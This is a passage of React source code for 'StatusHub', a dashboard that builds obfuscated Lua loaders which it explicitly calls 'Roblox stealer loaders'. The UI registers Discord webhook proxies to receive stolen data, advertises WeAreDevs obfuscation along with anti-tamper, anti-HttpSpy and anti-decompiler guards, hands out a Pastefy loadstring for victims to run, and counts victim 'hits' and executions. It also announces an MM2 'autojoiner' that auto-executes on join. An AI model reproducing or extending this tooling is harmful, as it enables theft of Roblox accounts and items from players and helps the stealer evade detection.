          <div className="rounded-2xl border border-purple-500/15 bg-purple-500/5 p-4 flex flex-col gap-4">
            <div>
              <p className="text-[10px] font-black tracking-[0.2em] uppercase text-purple-300">Webhook Proxy Management</p>
              <p className="text-[11px] text-white/35 mt-1">Register or test your webhook proxy from the same tab before building the loader.</p>
            </div>

            <Field
              label="Discord Webhook URL / Proxy"
              value={proxyInput}
              onChange={v => setProxyInput(v)}
              placeholder="https://discord.com/api/webhooks/... or /api/webhooks/proxy/..."
              mono
            />

            <div className="flex flex-wrap gap-3">
              <ActionBtn icon={Webhook} onClick={() => registerProxy(proxyInput)}>Register Proxy</ActionBtn>
              <ActionBtn icon={Zap} onClick={sendPing}>
                {pingStatus === 'sending' ? 'Sending…' : 'Send Ping'}
              </ActionBtn>
            </div>

            {proxyStatus === 'active' && (
              <div className="flex items-center gap-2 text-xs text-green-400">
                <Check size={13} />
                Webhook proxy registered successfully
              </div>
            )}
            {proxyStatus === 'error' && proxyMessage && (
              <div className="text-xs text-rose-300">{proxyMessage}</div>
            )}
            {pingStatus === 'success' && proxyMessage && (
              <div className="text-xs text-green-300">{proxyMessage}</div>
            )}
            {pingStatus === 'error' && proxyMessage && proxyStatus !== 'error' && (
              <div className="text-xs text-rose-300">{proxyMessage}</div>
            )}
          </div>

          <Field
            label="Discord Webhook URL / Proxy"
            value={webhook}
            onChange={v => setWebhook(v)}
            placeholder="https://discord.com/api/webhooks/... or /api/webhooks/proxy/..."
            mono
          />

          {proxyUrl && (
            <div className="rounded-xl border border-purple-500/20 bg-purple-500/10 p-3 text-xs text-purple-100">
              <p className="font-bold uppercase tracking-[0.2em] text-purple-300">Proxy Ready</p>
              <p className="mt-1 break-all font-mono text-purple-100/90">{proxyUrl}</p>
            </div>
          )}

          {/* Protection & Obfuscation Options */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 pt-2">
            <div className="flex items-center justify-between p-3.5 rounded-xl border border-white/[0.08] bg-black/40 select-none">
              <div className="flex items-center gap-2.5">
                <Shield size={16} className="text-purple-400" />
                <div>
                  <p className="text-xs font-bold text-white">Anti-Tamper Protection</p>
                  <p className="text-[10px] text-white/40">Always enabled</p>
                </div>
              </div>
              <div className="w-4 h-4 rounded border border-purple-500/50 bg-purple-500/30 flex items-center justify-center">
                <svg className="w-3 h-3 text-purple-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                </svg>
              </div>
            </div>

            <div className="flex items-center justify-between p-3.5 rounded-xl border border-white/[0.08] bg-black/40 select-none">
              <div className="flex items-center gap-2.5">
                <Lock size={16} className="text-purple-400" />
                <div>
                  <p className="text-xs font-bold text-white">WeAreDevs Obfuscation</p>
                  <p className="text-[10px] text-white/40">Always enabled</p>
                </div>
              </div>
              <div className="w-4 h-4 rounded border border-purple-500/50 bg-purple-500/30 flex items-center justify-center">
                <svg className="w-3 h-3 text-purple-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                </svg>
              </div>
            </div>
          </div>


          {errorMsg && (
            <div className="p-3 rounded-xl bg-rose-500/10 border border-rose-500/20 text-xs text-rose-300">
              {errorMsg}
            </div>
          )}

          <ActionBtn icon={Zap} onClick={handleBuildScript} data-build-btn>
            {loading ? 'Building & Obfuscating...' : 'Build & Obfuscate Script'}
          </ActionBtn>

          {loading && (
            <div className="flex items-center gap-3 p-3.5 rounded-xl bg-purple-500/10 border border-purple-500/20 text-xs text-purple-300 animate-pulse">
              <Sparkles size={16} className="animate-spin" />
              <span>{statusText || 'Processing backend script pipeline...'}</span>
            </div>
          )}

          {result && (
            <div className="flex flex-col gap-3 pt-2">
              <div className="bg-black/90 border border-purple-500/30 rounded-xl overflow-hidden shadow-2xl">
                <div className="flex items-center justify-between px-4 py-2.5 border-b border-purple-500/20 bg-purple-500/10">
                  <div className="flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
                    <span className="text-[10px] font-black tracking-widest uppercase text-purple-300">Pastefy Raw Loadstring</span>
                  </div>
                  <button
                    onClick={copyLoader}
                    className="flex items-center gap-1.5 px-2.5 py-1 rounded-md bg-purple-500/20 hover:bg-purple-500/40 text-[10px] font-bold text-purple-200 transition-colors"
                  >
                    {copied ? <><Check size={12} className="text-green-400" /> Copied Loadstring</> : <><Copy size={12} /> Copy Loadstring</>}
                  </button>
                </div>

                <div className="p-4 bg-[#070709] border-b border-white/[0.05]">
                  <code className="text-xs sm:text-sm font-mono text-purple-300 font-semibold break-all leading-relaxed select-all">
                    {result.loaderCommand}
                  </code>
                </div>

                <div className="px-4 py-3 bg-black/60 flex flex-wrap items-center justify-between gap-3 text-[11px] text-white/40">
                  <div className="flex items-center gap-4">
                    <span>Obfuscator: <strong className="text-purple-300">{result.obfuscatorProvider}</strong></span>
                    <span>Paste Service: <strong className="text-green-300">{result.pasteProvider}</strong></span>
                  </div>
                  <a
                    href={result.rawUrl}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex items-center gap-1 text-purple-400 hover:text-purple-300 transition-colors font-semibold"
                  >
                    <span>Raw Script URL</span>
                    <ExternalLink size={12} />
                  </a>
                </div>

                {result.stats && (
                  <div className="border-t border-white/[0.05] bg-[#09090c] px-4 py-4">
                    <div className="flex items-center justify-between gap-3 flex-wrap">
                      <div>
                        <p className="text-[10px] font-black tracking-[0.2em] uppercase text-purple-300">Script Channel</p>
                        <p className="text-[11px] text-white/40 mt-1">Live runs for this loader will appear here.</p>
                      </div>
                      <span className="rounded-full border border-purple-500/20 bg-purple-500/10 px-3 py-1 text-[10px] font-bold text-purple-200">
                        {result.stats.hits} hits
                      </span>
                    </div>
                    <div className="mt-3 space-y-2">
                      {(result.stats.recentEvents.length > 0 ? result.stats.recentEvents : [{ id: 'empty', message: 'No runs yet — the first execution will show up here.', at: new Date().toISOString() }]).map(event => (
                        <div key={event.id} className="flex items-center justify-between rounded-lg border border-white/[0.06] bg-black/40 px-3 py-2 text-[11px] text-white/60">
                          <span>{event.message}</span>
                          <span className="text-white/30">{new Date(event.at).toLocaleString([], { hour: 'numeric', minute: '2-digit' })}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            </div>
          )}
        </Card>
        </div>

        {/* Right: Stats & Execution Counter */}
        <div className="flex flex-col gap-4">
          {/* Execution Counter - Prominent Display */}
          <div className="relative overflow-hidden rounded-2xl p-6 bg-gradient-to-br from-indigo-950/50 via-[#0a0a0c] to-purple-900/20 border border-purple-500/20 backdrop-blur-xl">
            <div className="absolute inset-0 pointer-events-none">
              <div className="absolute top-0 right-0 w-32 h-32 bg-purple-600/20 rounded-full blur-3xl" />
            </div>
            <div className="relative z-10 text-center">
              <p className="text-[10px] font-black tracking-[0.2em] uppercase text-purple-300 mb-3">Total Executions</p>
              <p className="text-6xl font-black text-white mb-2">{executionCount.toLocaleString()}</p>
              <p className="text-xs text-white/40">Scripts generated & deployed</p>
            </div>
          </div>

          {/* Stats Cards */}
          <StatCard icon={Target} label="Your Hits" value={stats.yourHits.toLocaleString()} sub="Personal" accent="rgba(168,85,247,1)" />
          <StatCard icon={Users} label="Global Users" value={stats.globalUsers?.toLocaleString() || '0'} sub="Live" accent="rgba(196,181,253,1)" />
          <StatCard icon={Activity} label="Global Hits" value={stats.globalHits?.toLocaleString() || '0'} sub="All-time" accent="rgba(74,222,128,1)" />
        </div>
      </div>
    </div>
  );
}

/* ── Autojoiner (Coming Soon) ── */
function Autojoiner() {
  return (
    <div className="flex flex-col items-center justify-center flex-1 text-center px-6 py-20 relative">
      {/* Ambient glow */}
      <div className="absolute inset-0 pointer-events-none flex items-center justify-center">
        <div className="w-96 h-96 rounded-full blur-3xl opacity-20" style={{ background: 'radial-gradient(circle, #7c3aed, transparent 70%)' }} />
      </div>

      <div className="relative mb-10">
        <div className="absolute inset-0 rounded-3xl blur-2xl opacity-50" style={{ background: 'radial-gradient(circle, #7c3aed, transparent)' }} />
        <div className="relative w-28 h-28 rounded-3xl bg-gradient-to-b from-[#15151a] to-[#0a0a0c] border border-purple-500/30 flex items-center justify-center shadow-2xl shadow-purple-500/20">
          <Shuffle size={40} className="text-purple-400" />
          <div className="absolute -top-2 -right-2 w-6 h-6 rounded-full bg-purple-500/20 border border-purple-500/40 flex items-center justify-center">
            <Clock size={12} className="text-purple-300" />
          </div>
        </div>
      </div>

      <div className="flex items-center gap-3 mb-6">
        <span className="h-px w-10 bg-purple-500/30" />
        <span className="text-[10px] font-black tracking-[0.3em] uppercase text-purple-500/70">Autojoiner</span>
        <span className="h-px w-10 bg-purple-500/30" />
      </div>

      <h2 className="text-5xl md:text-7xl font-black leading-none tracking-tight mb-5">
        <span className="text-white/10 [-webkit-text-stroke:1px_rgba(255,255,255,0.12)]">COMING</span>
        <br />
        <span style={{ background: 'linear-gradient(120deg,#c4b5fd,#7c3aed)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>
          SOON
        </span>
      </h2>

      <p className="text-sm text-white/35 max-w-sm leading-relaxed mb-10">
        The MM2 Autojoiner is in active development. It'll auto-execute on join using your registered webhook — no manual steps required.
      </p>

      <div className="flex items-center gap-2.5 px-5 py-3 rounded-xl border border-white/[0.08] bg-[#0d0d10] text-xs text-white/40 hover:border-purple-500/30 hover:text-white/60 transition-all cursor-pointer">
        <Clock size={13} className="text-purple-400" />
        Drop in the Discord for updates
        <ChevronRight size={13} className="opacity-40" />
      </div>
    </div>
  );
}

/* ── Settings Component ── */
function Settings({ settings, onUpdateSettings }: { settings: AppSettings; onUpdateSettings: (s: AppSettings) => void }) {
  const [testHitMsg, setTestHitMsg] = useState('');

  const toggle = (key: keyof AppSettings) => {
    onUpdateSettings({ ...settings, [key]: !settings[key] });
  };

  const handleTestHit = async () => {
    try {
      const res = await fetch('/api/scripts/simulate-hit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: settings.anonymousMode ? 'Anonymous User' : 'sigmakid21' }),
      });
      if (res.ok) {
        setTestHitMsg('Test hit triggered! Check Overview to see hits increment.');
        setTimeout(() => setTestHitMsg(''), 3500);
      }
    } catch {
      setTestHitMsg('Failed to trigger hit.');
    }
  };

  const handleToggleSimulation = async () => {
    const nextVal = !settings.autoSimulation;
    onUpdateSettings({ ...settings, autoSimulation: nextVal });
    await fetch('/api/scripts/toggle-simulation', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ enabled: nextVal }),
    }).catch(() => null);
  };

  return (
    <div className="flex flex-col gap-6 max-w-3xl">
      <div>
        <h1 className="text-3xl font-black text-white tracking-tight">Settings</h1>
        <p className="text-xs text-white/30 mt-1">Configure anonymity, live hit simulation, obfuscation defaults, anti-tamper guards & deployment options</p>
      </div>

      {/* Privacy & Anonymity Settings */}
      <Card icon={EyeOff} title="Anonymity & Display Settings" desc="Hide target usernames and personalize how activity events appear across StatusHub">
        <div className="flex flex-col gap-4">
          <label className="flex items-center justify-between p-4 rounded-xl border border-white/[0.08] bg-black/40 cursor-pointer hover:border-purple-500/30 transition-all select-none">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 rounded-lg bg-purple-500/10 border border-purple-500/20 flex items-center justify-center">
                <EyeOff size={15} className="text-purple-400" />
              </div>
              <div>
                <p className="text-xs font-bold text-white">Anonymous Mode</p>
                <p className="text-[11px] text-white/40">Replace usernames with "Anonymous User" in activity</p>
              </div>
            </div>
            <input
              type="checkbox"
              checked={settings.anonymousMode}
              onChange={() => toggle('anonymousMode')}
              className="w-4 h-4 accent-purple-500 rounded cursor-pointer"
            />
          </label>

        </div>
      </Card>

      {/* Obfuscation & Security Preferences */}
      <Card icon={ShieldCheck} title="Obfuscation & Anti-Tamper Configuration" desc="Default security parameters applied when generating new Roblox stealer loaders">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-3">

          <div className="flex items-center justify-between p-3.5 rounded-xl border border-white/[0.08] bg-black/40 select-none opacity-60">
            <div className="flex items-center gap-2.5">
              <Shield size={16} className="text-purple-400" />
              <div>
                <p className="text-xs font-bold text-white">Anti-HttpSpy Guard</p>
                <p className="text-[10px] text-white/40">Always enabled</p>
              </div>
            </div>
            <div className="w-4 h-4 accent-purple-500 rounded bg-purple-500/40" />
          </div>

          <div className="flex items-center justify-between p-3.5 rounded-xl border border-white/[0.08] bg-black/40 select-none opacity-60">
            <div className="flex items-center gap-2.5">
              <Lock size={16} className="text-purple-400" />
              <div>
                <p className="text-xs font-bold text-white">Anti-Decompiler Protection</p>
                <p className="text-[10px] text-white/40">Always enabled</p>
              </div>
            </div>
            <div className="w-4 h-4 accent-purple-500 rounded bg-purple-500/40" />
          </div>

          <div className="flex items-center justify-between p-3.5 rounded-xl border border-white/[0.08] bg-black/40 select-none opacity-60">
            <div className="flex items-center gap-2.5">
              <Copy size={16} className="text-purple-400" />
              <div>
                <p className="text-xs font-bold text-white">Auto-Copy Loadstring on Build</p>
                <p className="text-[10px] text-white/40">Always enabled</p>
              </div>
            </div>
            <div className="w-4 h-4 accent-purple-500 rounded bg-purple-500/40" />
          </div>

          <div className="flex items-center justify-between p-3.5 rounded-xl border border-white/[0.08] bg-black/40 select-none opacity-60">
            <div className="flex items-center gap-2.5">
              <Bell size={16} className="text-purple-400" />
              <div>
                <p className="text-xs font-bold text-white">Webhook Ping Notifications</p>
                <p className="text-[10px] text-white/40">Always enabled</p>
              </div>
            </div>
            <div className="w-4 h-4 accent-purple-500 rounded bg-purple-500/40" />
          </div>

        </div>

        <Field
          label="Custom Script Watermark Header"
          value={settings.customWatermark}
          onChange={v => onUpdateSettings({ ...settings, customWatermark: v })}
          placeholder="e.g. -- Protected by StatusHub"
          mono
        />
      </Card>

    </div>
  );
}

/* ── Dashboard shell ── */
export default function Dashboard({ onExit, onLogout }: { onExit: () => void; onLogout?: () => void }) {
  const [active, setActive] = useState<Tab>('scripts');
  const [settings, setSettings] = useState<AppSettings>(() => {
    try {
      const saved = localStorage.getItem('statushub_settings');
      return saved ? { ...DEFAULT_SETTINGS, ...JSON.parse(saved) } : DEFAULT_SETTINGS;
    } catch {
      return DEFAULT_SETTINGS;
    }
  });

  const handleUpdateSettings = (newSettings: AppSettings) => {
    setSettings(newSettings);
    try {
      localStorage.setItem('statushub_settings', JSON.stringify(newSettings));
    } catch {
      // Ignore storage errors
    }
  };

  const content: Record<Tab, React.ReactNode> = {
    scripts:    <Scripts />,
    autojoiner: <Autojoiner />,
    settings:   <Settings settings={settings} onUpdateSettings={handleUpdateSettings} />,
  };

  return (
    <div className="flex h-screen bg-[#050505] text-white overflow-hidden">

      {/* Sidebar */}
      <aside className="w-60 shrink-0 flex flex-col border-r border-white/[0.05] bg-black/40 backdrop-blur-xl relative">
        <div className="absolute inset-0 pointer-events-none opacity-50" style={{ background: 'radial-gradient(ellipse 100% 40% at 50% 0%, rgba(124,58,237,0.08), transparent)' }} />

        {/* Logo */}
        <div className="relative h-14 flex items-center gap-2.5 px-5 border-b border-white/[0.05]">
          <img src="/3d2ce9ea-84e6-4fca-8f2c-59feb56d1143_(2).png" alt="SH" className="w-7 h-7 rounded-full" />
          <span className="text-xs font-black tracking-[0.15em] uppercase">
            Status<span className="text-purple-400">Hub</span>
          </span>
        </div>

        {/* Nav */}
        <nav className="relative flex flex-col gap-1 p-3 flex-1">
          <p className="text-[9px] font-black tracking-[0.2em] uppercase text-white/15 px-3 mb-1 mt-1">Menu</p>
          {NAV.map(({ id, icon: Icon, label }) => (
            <button
              key={id}
              onClick={() => setActive(id)}
              className={`relative flex items-center gap-3 px-3 py-2.5 rounded-xl text-sm font-semibold transition-all duration-200 text-left w-full group ${
                active === id
                  ? 'bg-purple-500/15 text-purple-200'
                  : 'text-white/35 hover:text-white/70 hover:bg-white/[0.04]'
              }`}
            >
              {active === id && <span className="absolute left-0 top-1/2 -translate-y-1/2 w-0.5 h-5 rounded-full bg-purple-400" />}
              <Icon size={16} className={active === id ? 'text-purple-400' : 'text-white/25 group-hover:text-white/50'} />
              {label}
              {id === 'autojoiner' && (
                <span className="ml-auto text-[8px] font-black tracking-widest uppercase text-purple-500/60 border border-purple-500/20 rounded px-1.5 py-0.5">
                  Soon
                </span>
              )}
            </button>
          ))}
        </nav>

        {/* User profile */}
        <div className="relative p-3 border-t border-white/[0.05]">
          <div className="flex items-center gap-3 px-3 py-2.5 rounded-xl bg-white/[0.02] mb-1">
            {(() => {
              try {
                const userStr = localStorage.getItem('user');
                const user = userStr ? JSON.parse(userStr) : null;
                if (user?.avatar) {
                  return (
                    <img
                      src={`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`}
                      alt={user.username}
                      className="w-8 h-8 rounded-full shrink-0"
                    />
                  );
                }
                return (
                  <div className="w-8 h-8 rounded-full bg-gradient-to-br from-purple-500 to-purple-700 flex items-center justify-center text-xs font-black text-white shrink-0">
                    {user?.username?.charAt(0).toUpperCase() || 'U'}
                  </div>
                );
              } catch {
                return (
                  <div className="w-8 h-8 rounded-full bg-gradient-to-br from-purple-500 to-purple-700 flex items-center justify-center text-xs font-black text-white shrink-0">
                    U
                  </div>
                );
              }
            })()}
            <div className="flex-1 min-w-0">
              <p className="text-xs font-bold text-white/80 truncate">
                {(() => {
                  try {
                    const userStr = localStorage.getItem('user');
                    const user = userStr ? JSON.parse(userStr) : null;
                    return settings.anonymousMode ? 'Anonymous User' : (user?.username || 'User');
                  } catch {
                    return 'User';
                  }
                })()}
              </p>
              <p className="text-[10px] text-white/25 truncate">{settings.anonymousMode ? 'Anonymized Mode' : 'Authenticated'}</p>
            </div>
          </div>
          <div className="space-y-2">
            <button
              onClick={onExit}
              className="flex items-center gap-3 px-3 py-2.5 rounded-xl text-sm font-semibold text-white/25 hover:text-white/60 hover:bg-white/[0.04] transition-all w-full"
            >
              <LogOut size={15} />
              Back to Site
            </button>
            {onLogout && (
              <button
                onClick={onLogout}
                className="flex items-center gap-3 px-3 py-2.5 rounded-xl text-sm font-semibold text-rose-400/60 hover:text-rose-300 hover:bg-rose-500/[0.04] transition-all w-full"
              >
                <LogOut size={15} />
                Logout
              </button>
            )}
          </div>
        </div>
      </aside>

      {/* Main */}
      <main className="flex-1 overflow-y-auto flex flex-col">
        {/* Top bar */}
        <div className="h-14 shrink-0 flex items-center justify-between px-8 border-b border-white/[0.05] bg-black/40 backdrop-blur-xl sticky top-0 z-10">
          <div className="flex items-center gap-2 text-[10px] font-bold tracking-widest uppercase text-white/20">
            <span>StatusHub</span>
            <ChevronRight size={11} className="text-white/10" />
            <span className="text-purple-400/80">{NAV.find(n => n.id === active)?.label}</span>
          </div>
          <div className="flex items-center gap-2">
            <span className="flex items-center gap-1.5 text-[9px] font-black tracking-widest uppercase text-green-400">
              <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
              Online
            </span>
          </div>
        </div>

        {/* Content */}
        <div className={`flex-1 p-8 ${active === 'autojoiner' ? 'flex flex-col' : ''}`}>
          {content[active]}
        </div>
      </main>
    </div>
  );
}
